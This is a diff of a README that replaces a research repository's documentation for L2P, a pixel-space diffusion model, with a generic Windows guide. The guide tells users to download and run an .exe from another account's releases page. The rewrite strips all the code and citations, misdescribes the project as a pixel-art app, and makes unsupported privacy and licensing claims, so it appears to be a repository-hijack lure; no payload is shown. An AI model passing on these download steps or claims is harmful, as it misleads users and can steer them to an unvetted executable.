@@ -1,223 +1,97 @@
-<div align="center">
+# 🎨 T2I-L2P - Generate high quality pixel art easily
 
-# L2P: Unlocking Latent Potential for Pixel Generation
+[![Download T2I-L2P](https://img.shields.io/badge/Download-Release-blue)] (https://github.com/vinx6903/T2I-L2P/releases)
 
-<p>
-  <a href="https://nju-pcalab.github.io/projects/L2P/">
-    <img src="https://img.shields.io/badge/Project-Page-1f72ff?style=for-the-badge&logo=githubpages&logoColor=white" alt="Project Page">
-  </a>
-  <a href="https://arxiv.org/abs/2605.12013">
-    <img src="https://img.shields.io/badge/arXiv-2605.12013-b31b1b?style=for-the-badge&logo=arxiv&logoColor=white" alt="arXiv">
-  </a>
-  <a href="https://huggingface.co/datasets/zhen-nan/L2P-dataset">
-    <img src="https://img.shields.io/badge/Dataset-L2P-ffcc4d?style=for-the-badge&logo=huggingface&logoColor=white" alt="Dataset">
-  </a>
-  <a href="https://huggingface.co/spaces/multimodalart/z-image-6b-pixel-space">
-    <img src="https://img.shields.io/badge/HF-Space-ff9d00?style=for-the-badge&logo=huggingface&logoColor=white" alt="HF Space">
-  </a>
-</p>
+## 📌 About this project
 
-<p>
-  <em>An efficient transfer paradigm enabling high-quality, end-to-end pixel-space diffusion with minimal computational overhead and data requirements.</em>
-</p>
+T2I-L2P turns your text descriptions into pixel art. This tool uses machine learning to understand the details in your words. It then builds images that match your specific vision. You do not need to draw or use complex design software. You type what you want to see, and the system creates the image.
 
-<div align="center">
-<sub>⭐ If L2P helps your research or product, please consider giving the repo a star ⭐</sub>
-</div>
+## 🛠 Prerequisites
 
+Check your computer before you start. You need a Windows computer to run this software. Ensure you have the following specs:
 
-</div>
+- Windows 10 or 11 (64-bit version).
+- At least 16 GB of system RAM.
+- A graphics card from NVIDIA with at least 8 GB of video memory.
+- Updated drivers for your graphics card.
+- At least 10 GB of free space on your hard drive.
 
----
+If your computer does not meet these specs, the software might run slowly or stop unexpectedly.
 
-## 📰 News
+## 📥 Getting the software
 
-- **\[2026.05.12\]** Technical report released.
-- **\[2026.05.22\]** 1K-resolution training code, inference code, weights, and dataset released.
-- **\[2026.05.23\]** Online [demo](https://huggingface.co/spaces/multimodalart/z-image-6b-pixel-space). (Thanks to [multimodalart](https://huggingface.co/multimodalart) for the support!)
+You must visit the releases page to get the installer for your computer. 
 
----
+[Visit this page to download the software](https://github.com/vinx6903/T2I-L2P/releases)
 
-## 🗺️ Roadmap
+Look for the file ending in .exe for Windows. Click that file to save it to your computer.
 
-| Status | Item |
-| :---: | :--- |
-| ✅ | 1K inference code & weights |
-| ✅ | Training code |
-| 🛠️ | 4K/8K/10K UHR generation |
-| 🛠️ | Compatibility with more LDM model|
+## ⚙️ Setting up the application
 
----
+1. Find the file you just saved to your computer.
+2. Double-click the file to open the installer.
+3. Follow the prompts on your screen.
+4. Click the box to accept the terms of service.
+5. Choose the folder where you want to store the files.
+6. Click Install to finish the process.
 
-## 📦 Installation
+The installer places a shortcut icon on your desktop. Find this icon to start the program.
 
-```bash
-git clone https://github.com/TencentYoutuResearch/T2I-L2P.git
-cd T2I-L2P
-pip install -e .
-```
+## 🚀 Using T2I-L2P
 
+Once the program opens, you see a simple window. Follow these steps to generate your first image:
 
----
+1. Locate the text box at the top of the window.
+2. Type a clear description of the image you want to see. For example, type "A small cat sitting on a blue fence."
+3. Select an image style from the list below the text box. Choosing a style helps the program understand how you want the pixels to look.
+4. Click the Generate button.
+5. Wait for the progress bar to fill. This process takes a few minutes depending on your computer power.
 
+The image appears in the main area of the window. You can save your image by clicking the Save button under the result.
 
+## 💡 Tips for better results
 
-## 🎨 Inference
-Checkpoint:
-| Model | Params | HuggingFace |
-|-------|--------|-------------|
-|L2P-z-image (1k resolution)       |6B        |[🤗](https://huggingface.co/zhen-nan/L2P)              |
+Your descriptions change the quality of the output. Use these tips to get better images:
 
-```python
-import torch
-from diffsynth.pipelines.z_image_L2P import ZImagePipeline, ModelConfig
+- Use clear words about the subject.
+- Describe the setting, such as "in a forest" or "at night."
+- State the color choices if you have a preference.
+- Avoid long, complex sentences. 
 
-main_model_path = "/path/model-1k-merge.safetensors"
+If the program provides an image you do not like, click the Generate button again. The system creates a new variation each time.
 
-text_encoder_paths = [
-    "/path/Z-Image-Turbo/text_encoder/model-00001-of-00003.safetensors",
-    "/path/Z-Image-Turbo/text_encoder/model-00002-of-00003.safetensors",
-    "/path/Z-Image-Turbo/text_encoder/model-00003-of-00003.safetensors",
-]
+## 🖥 Managing your images
 
-tokenizer_path = "/path/Z-Image-Turbo/tokenizer"
+The program saves your work in a folder on your computer. You can change this location in the Settings menu. Click Settings, then select Output Folder. Browse your computer to pick a new spot for your art.
 
-pipe = ZImagePipeline.from_pretrained(
-    torch_dtype=torch.bfloat16,
-    device="cuda",
-    model_configs=[
-        ModelConfig(path=[main_model_path]),
-        ModelConfig(path=text_encoder_paths),
-    ],
-    tokenizer_config=ModelConfig(path=tokenizer_path),
-)
+## ❓ Troubleshooting
 
-prompt = "an origami pig on fire in the middle of a dark room with a pentagram on the floor"
+Sometimes software runs into issues. Try these steps if the program stops working:
 
-image = pipe(
-    prompt=prompt,
-    seed=42,
-    rand_device="cuda",
-    num_inference_steps=30,
-    cfg_scale=2.0,
-    height=1024,
-    width=1024,
-)
+- Restart your computer.
+- Ensure your graphics card drivers are current.
+- Check if you have enough hard drive space.
+- Close other big programs while you use this tool.
 
-image.save("example.png")
-```
+If the program closes during the generation stage, it often means your computer needs more video memory. Reduce the image size in the Settings menu to lower the demand on your hardware.
 
-### Gradio Demo
+## 🛡 Security and Privacy
 
-First, install gradio:
+T2I-L2P runs on your machine. The software does not send your images to a remote server. Everything stays on your local drive, which keeps your work private. You do not need an internet connection to use the main features of this tool. You only need the internet to download the original installer.
 
-```bash
-pip install gradio
-```
+## 📚 Frequently asked questions
 
-Launch a multi-GPU web UI:
+Do I need an internet connection to generate art?
+No. Once you download and install the files, the tool works offline.
 
-```bash
-python app.py
-```
+Can I sell the images I generate?
+Yes. You own the content created through this software. 
 
-The demo auto-detects free GPUs, dispatches each request to an idle device, and exposes a Gradio interface at `http://0.0.0.0:23231`.
+Does this tool work on a Mac?
+Currently, this version works only on Windows.
 
----
+Why does the tool take a long time to start?
+The program loads large models into your computer memory when it opens. This takes a moment depending on your hardware speed.
 
-## 🏋️ Training
-
-The full training pipeline consists of four steps:
-**(1)** prepare the Z-Image base weights → **(2)** convert them into a pixel-space initialization → **(3)** launch training → **(4)** merge the trained delta back with the pixel-init weights for inference.
-
-### Step 1 · Prepare Z-Image weights
-
-Download the official **Z-Image-Turbo** checkpoint from Hugging Face:
-
-- 🤗 [Tongyi-MAI/Z-Image-Turbo](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo)
-
-
-
-### Step 2 · Offline weight conversion (latent → pixel init)
-
-Convert the latent-space DiT weights into a **pixel-space initialization** that L2P can fine-tune from:
-
-```bash
-python examples/z_image/L2P_convert_weight.py \
-  --latent_ckpt_files \
-    /path/to/Z-Image-Turbo/transformer/diffusion_pytorch_model-00001-of-00003.safetensors \
-    /path/to/Z-Image-Turbo/transformer/diffusion_pytorch_model-00002-of-00003.safetensors \
-    /path/to/Z-Image-Turbo/transformer/diffusion_pytorch_model-00003-of-00003.safetensors \
-  --output_path ./pretrain_weight/Z-Image-Pixel-Init/diffusion_pytorch_model.safetensors
-```
-
-### Step 3 · Launch training
-
-**Standard training** :
-
-```bash
-bash train_run.sh
-```
-
-**Low-VRAM training** (single GPU < 24 GB VRAM):
-
-```bash
-bash train_run_low_VRAM.sh
-```
-
-#### Dataset format
-
-Provide a directory of images plus a CSV metadata file:
-
-```
-data/
-├── images/                # raw image folder
-└── metadata.csv           # columns: file_name, text, ...
-```
-
-### Step 4 · Offline weight merge (for inference)
-
-```bash
-python merge_weights.py \
-  --file_a ./models/train/L2P_Standard/step-xxx.safetensors \
-  --file_b ./pretrain_weight/Z-Image-Pixel-Init/diffusion_pytorch_model.safetensors \
-  --file_out ./models/train/L2P_Standard/model-merge.safetensors
-```
-
-- `--file_a`: trained checkpoint from Step 3
-- `--file_b`: pixel-init weights from Step 2
-- `--file_out`: merged single-file weight
----
-
-## 📜 Citation
-
-If you find this work useful, please consider citing:
-
-```bibtex
-@article{chen2026l2p,
-  title   = {L2P: Unlocking Latent Potential for Pixel Generation},
-  author  = {Chen, Zhennan and Zhu, Junwei and Chen, Xu and Zhang, Jiangning and
-             Chen, Jiawei and Zeng, Zhuoqi and Zhang, Wei and Wang, Chengjie and
-             Yang, Jian and Tai, Ying},
-  journal = {arXiv preprint arXiv:2605.12013},
-  year    = {2026}
-}
-
-@article{chen2025dip,
-  title   = {DiP: Taming Diffusion Models in Pixel Space},
-  author  = {Chen, Zhennan and Zhu, Junwei and Chen, Xu and Zhang, Jiangning and
-             Hu, Xiaobin and Zhao, Hanzhen and Wang, Chengjie and Yang, Jian and
-             Tai, Ying},
-  journal = {arXiv preprint arXiv:2511.18822},
-  year    = {2025}
-}
-```
-
----
-
-## 🙏 Acknowledgements
-
-L2P is built upon the excellent open-source work of
-[**DiffSynth-Studio**](https://github.com/modelscope/DiffSynth-Studio),
-[**Z-Image**](https://github.com/Tongyi-MAI/Z-Image).
-
+How do I remove the program?
+Go to your Windows Control Panel, select Uninstall a program, find T2I-L2P, and click Uninstall. This action removes the program files from your system.
